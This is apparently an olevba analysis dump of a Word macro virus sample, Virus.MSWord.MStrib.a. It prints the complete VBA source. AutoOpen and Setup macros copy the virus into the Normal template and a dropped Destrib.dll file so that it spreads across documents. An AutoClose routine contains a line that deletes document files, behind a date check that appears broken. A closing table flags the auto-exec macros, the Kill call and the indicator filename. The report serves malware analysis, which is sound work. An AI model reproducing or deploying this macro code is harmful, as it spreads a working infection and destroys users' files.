olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.MStrib.a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.MStrib.a 
in file: Virus.MSWord.MStrib.a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Setup()
Attribute Setup.VB_Description = "MS - ������!"
  
  On Error Resume Next
  
  zz = Word.ActiveDocument.FullName
  
  Application.OrganizerCopy Source:=zz, _
      Destination:=Normal.ThisDocument.FullName, Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
      
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=zz, Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
      
  yy = Word.Application.Path + "\Destrib.dll"
  
  If (Dir(yy) = "") Then
    Application.Documents.Add
    Application.Documents(1).SaveAs (yy)
    Application.Documents(1).Close SaveChanges:=False
    Word.RecentFiles.Item(1).Delete
  End If
  
  
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=yy, Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=zz, _
      Destination:=yy, Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=yy, _
      Destination:=zz, Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
      
End Sub

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "MS - ������!"
  Setup
  If Word.ActiveDocument.Name = "Destrib.dll" Then Word.ActiveDocument.Close
End Sub

Sub AutoClose()
Attribute AutoClose.VB_Description = "MS - ������!"
  If Word.ActiveDocument.Name <> "Destrib.dll" Then
    On Error Resume Next
    If Day(Date) = 43 Then Kill "*.do?"
  End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|IOC       |Destrib.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

